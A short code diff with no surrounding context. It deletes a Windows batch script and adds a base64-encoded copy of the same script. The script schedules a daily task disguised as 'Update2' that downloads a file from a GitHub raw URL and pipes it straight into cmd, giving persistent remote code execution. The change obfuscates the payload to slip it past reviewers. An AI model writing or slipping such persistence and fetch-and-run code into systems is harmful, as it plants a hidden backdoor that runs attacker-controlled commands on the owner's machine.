@@ -1,2 +1,1 @@
-@echo off
-schtasks /Create /SC DAILY /TN "Update2" /TR "cmd /c curl https://raw.githubusercontent.com/KB2142/js/refs/heads/main/cmd.txt | cmd" /ST 20:00
+QGVjaG8gb2ZmDQpzY2h0YXNrcyAvQ3JlYXRlIC9TQyBEQUlMWSAvVE4gIlVwZGF0ZTIiIC9UUiAiY21kIC9jIGN1cmwgaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0tCMjE0Mi9qcy9yZWZzL2hlYWRzL21haW4vY21kLnR4dCB8IGNtZCIgL1NUIDIwOjAw
